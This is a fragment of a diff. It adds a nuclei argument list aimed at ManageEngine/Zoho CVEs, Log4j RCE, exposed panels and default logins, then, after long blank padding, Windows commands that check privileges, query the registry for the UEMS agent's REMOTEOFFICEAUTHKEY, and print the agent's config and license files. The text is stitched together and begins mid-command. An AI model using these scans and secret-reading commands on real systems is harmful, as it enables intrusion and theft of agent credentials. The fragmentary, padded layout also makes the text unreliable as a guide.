@@ -1,1 +1,54 @@
+
+
 -t /root/.local/nuclei-templates/http/cves/2021/CVE-2021-44515.yaml -t /root/.local/nuclei-templates/http/cves/2022/CVE-2022-47966.yaml -t /root/.local/nuclei-templates/http/cves/2020/CVE-2020-10189.yaml -t /root/.local/nuclei-templates/http/cves/2021/CVE-2021-44077.yaml -t /root/.local/nuclei-templates/http/cves/2022/CVE-2022-35405.yaml -t /root/.local/nuclei-templates/http/cves/2022/CVE-2022-28219.yaml -t /root/.local/nuclei-templates/http/cves/2022/CVE-2022-29081.yaml -t /root/.local/nuclei-templates/http/cves/2022/CVE-2022-36923.yaml -t /root/.local/nuclei-templates/http/cves/2022/CVE-2022-24681.yaml -t /root/.local/nuclei-templates/http/cves/2022/CVE-2022-28987.yaml -t /root/.local/nuclei-templates/http/cves/2023/CVE-2023-29084.yaml -t /root/.local/nuclei-templates/http/cves/2023/CVE-2023-47211.yaml -t /root/.local/nuclei-templates/http/vulnerabilities/other/manage-engine-dc-log4j-rce.yaml -t /root/.local/nuclei-templates/http/exposed-panels/zoho/ -t /root/.local/nuclei-templates/http/default-logins/zoho/ -t /root/.local/nuclei-templates/http/misconfiguration/manage-engine-ad-search.yaml
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+whoami /groups | findstr /i "medium deny"
+
+# 2. Read the key
+reg query "HKLM\SOFTWARE\WOW6432Node\ManageEngine\UEMS_Agent" /v REMOTEOFFICEAUTHKEY
+
+
+# 3. Read license/auth data
+dir "C:\Program Files (x86)\ManageEngine\UEMS_Agent\dcdata\*.txt"
+type "C:\Program Files (x86)\ManageEngine\UEMS_Agent\dcdata\server-config.txt"
